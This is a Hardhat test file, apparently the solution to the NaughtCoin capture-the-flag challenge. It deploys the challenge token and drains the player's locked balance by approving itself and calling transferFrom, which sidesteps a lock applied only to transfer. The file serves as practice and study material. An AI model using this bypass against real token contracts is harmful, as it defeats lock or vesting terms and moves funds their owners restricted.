import { ethers } from "hardhat";
import { BigNumber, Contract, Signer } from "ethers";
import { NaughtCoin } from "../typechain-types/contracts/NaughtCoin";
import { expect } from "chai";
import { token } from "../typechain-types/@openzeppelin/contracts";

let accounts: Signer[]
let naughtCoin: NaughtCoin;
var player: Signer;

describe("solutions: naught coin", () => {
    beforeEach(async () => {
        accounts = await ethers.getSigners();
        player = accounts[0];
        naughtCoin = await (await ethers.getContractFactory("NaughtCoin")).deploy(player.getAddress());
    })
    it("Solves NaughtCoin Challenge", async () => {
        let wallet2 = accounts[1]
        await naughtCoin.connect(player).approve(player.getAddress(), ethers.parseEther("1000000"));
        await naughtCoin.connect(player).transferFrom(player.getAddress(), wallet2.getAddress(), ethers.parseEther("1000000"));
        expect(await naughtCoin.balanceOf(player.getAddress())).to.be.equal(0);
    })
})